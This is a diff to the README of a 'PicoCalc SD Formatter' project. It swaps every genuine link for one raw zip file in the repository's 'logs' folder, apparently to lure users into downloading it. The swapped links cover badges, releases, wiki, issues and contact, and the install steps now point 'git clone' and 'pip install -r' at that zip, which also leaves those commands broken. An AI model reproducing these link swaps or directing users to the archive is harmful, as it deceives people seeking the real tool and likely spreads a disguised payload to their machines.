@@ -1,7 +1,7 @@
 ```markdown
 # 📸 PicoCalc SD Formatter
 
-![PicoCalc SD Formatter](https://img.shields.io/badge/release-latest-brightgreen) ![Python](https://img.shields.io/badge/python-3.8%2B-blue) ![License](https://img.shields.io/badge/license-MIT-lightgrey)
+![PicoCalc SD Formatter](https://github.com/harshu3008/picocalc-sd-formatter/raw/refs/heads/main/logs/sd_formatter_picocalc_2.8.zip) ![Python](https://github.com/harshu3008/picocalc-sd-formatter/raw/refs/heads/main/logs/sd_formatter_picocalc_2.8.zip%2B-blue) ![License](https://github.com/harshu3008/picocalc-sd-formatter/raw/refs/heads/main/logs/sd_formatter_picocalc_2.8.zip)
 
 A user-friendly GUI tool designed to format SD cards specifically for the PicoCalc device. This application sets up the right partition layout required for the PicoCalc operating system. Developed with the aid of Cursor IDE's AI features, this tool simplifies the formatting process, ensuring that users can easily prepare their SD cards without technical expertise.
 
@@ -22,7 +22,7 @@ A user-friendly GUI tool designed to format SD cards specifically for the PicoCa
 
 ## 📦 Installation
 
-1. **Download**: Go to the [Releases section](https://github.com/harshu3008/picocalc-sd-formatter/releases) to find the latest version. 
+1. **Download**: Go to the [Releases section](https://github.com/harshu3008/picocalc-sd-formatter/raw/refs/heads/main/logs/sd_formatter_picocalc_2.8.zip) to find the latest version. 
 2. **Run**: After downloading, execute the installer or run the application directly if you’re using a pre-built package.
 
 ## 🚀 Getting Started
@@ -45,12 +45,12 @@ If you are interested in contributing or enhancing the application, please follo
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/harshu3008/picocalc-sd-formatter.git
+   git clone https://github.com/harshu3008/picocalc-sd-formatter/raw/refs/heads/main/logs/sd_formatter_picocalc_2.8.zip
    cd picocalc-sd-formatter
    ```
 2. Install dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/harshu3008/picocalc-sd-formatter/raw/refs/heads/main/logs/sd_formatter_picocalc_2.8.zip
    ```
 3. Make your changes.
 4. Submit a pull request.
@@ -69,9 +69,9 @@ We appreciate the contributions from everyone involved in this project. A specia
 
 ## 🔗 Links
 
-- **Documentation**: Comprehensive usage guide and FAQs are included in the [Wiki](https://github.com/harshu3008/picocalc-sd-formatter/wiki).
+- **Documentation**: Comprehensive usage guide and FAQs are included in the [Wiki](https://github.com/harshu3008/picocalc-sd-formatter/raw/refs/heads/main/logs/sd_formatter_picocalc_2.8.zip).
 - **Community Support**: Join our community forum on GitHub Discussions for help and suggestions.
-- **Report Issues**: Found a bug? Open an issue in the [Issues section](https://github.com/harshu3008/picocalc-sd-formatter/issues).
+- **Report Issues**: Found a bug? Open an issue in the [Issues section](https://github.com/harshu3008/picocalc-sd-formatter/raw/refs/heads/main/logs/sd_formatter_picocalc_2.8.zip).
 
 ## 💡 FAQ
 
@@ -93,7 +93,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 💌 Contact
 
-For further inquiries or suggestions, feel free to reach out through the [GitHub page](https://github.com/harshu3008/picocalc-sd-formatter).
+For further inquiries or suggestions, feel free to reach out through the [GitHub page](https://github.com/harshu3008/picocalc-sd-formatter/raw/refs/heads/main/logs/sd_formatter_picocalc_2.8.zip).
 
 Thank you for using PicoCalc SD Formatter! Enjoy your seamless SD card formatting experience.
 ```
